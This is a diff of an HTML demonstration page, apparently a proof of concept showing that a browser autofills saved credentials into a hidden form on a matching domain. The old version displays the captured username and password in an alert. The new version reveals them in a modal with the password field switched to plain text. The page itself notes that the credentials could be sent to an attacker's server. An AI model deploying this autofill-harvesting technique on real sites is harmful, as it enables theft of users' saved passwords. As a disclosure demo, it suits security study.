@@ -1,40 +1,63 @@
 <!doctype html>
 <html>
 <head>
-	<style>
-		div.hide-me { display: none; visibility: hidden; }
-	</style>
-	<script src="https://code.jquery.com/jquery-2.1.0.js"></script>
-    <script>
-        $('document').ready( function () {
-          setTimeout(function () {
-        	  window.alert(
-			      'Username: ' + $('input#username')[0].value + '\n' +
-			      'Password: ' + $('input#password')[0].value
-			  )
-          }, 2000);
-        });
-    </script>
+    <link rel="stylesheet" type="text/css" href="/static/bower_components/bootstrap/dist/css/bootstrap.css">
+    <link rel="stylesheet" type="text/css" href="/static/bower_components/bootstrap/dist/css/bootstrap-theme.css">
 </head>
 <body>
-	<div>
-		<h1>Welcome to average mr hacker's site...</h1>
-		<p>
-			There is a hidden form on this page, and because this url's domain part
-			matches the one you saved your password for, it will get autofilled by
-			chrome.
-		</p>
-		<p>
-			Mr hacker is a kind guy so he will only show you an alert box with your
-			credentials, but he could send them to his server with an XHR request...
-		</p>
-	</div>
-	<div class="hide-me">
-		<form method="post" action="">
-			Username: <input id="username" name="username" type="text">
-			Password: <input id="password" name="password" type="password">
-			<input type="submit" name="submit" value="Submit">
-		</form>
-	</div>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-8 col-xs-offset-2">
+                <h1>Welcome to average mr hacker's site...</h1>
+                <p>
+                    There is a hidden form on this page, and because this url's domain part
+                    matches the one you saved your password for, it will get autofilled by
+                    chrome.
+                </p>
+                <p>
+                    Mr hacker is a kind guy so he will only show you an alert box with your
+                    credentials, but he could send them to his server with an XHR request...
+                </p>
+            </div>
+        </div>
+    </div>
+    <!-- Modal -->
+    <div class="modal fade" id="password-modal" tabindex="-1" role="dialog" aria-labelledby="password-modal" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                    <h4 class="modal-title" id="myModalLabel">Your credenitals</h4>
+                </div>
+                <div class="modal-body">
+                    <form role="form" method="post" action="">
+                        <div class="form-group">
+                            <label for="username">Email address</label>
+                            <input type="text" class="form-control" id="username" name="username"
+                                   placeholder="Enter username">
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <input type="password" class="form-control" id="password" name="password"
+                                   placeholder="Enter password">
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="/static/bower_components/jquery/dist/jquery.js"></script>
+    <script src="/static/bower_components/bootstrap/dist/js/bootstrap.js"></script>
+    <script>
+        $('document').ready(function () {
+            setTimeout(function () {
+                $('input#password').attr('type', 'text');
+                $('input').attr('disabled', true);
+                $('#password-modal').modal('show');
+            }, 1000);
+        })
+    </script>
 </body>
 </html>
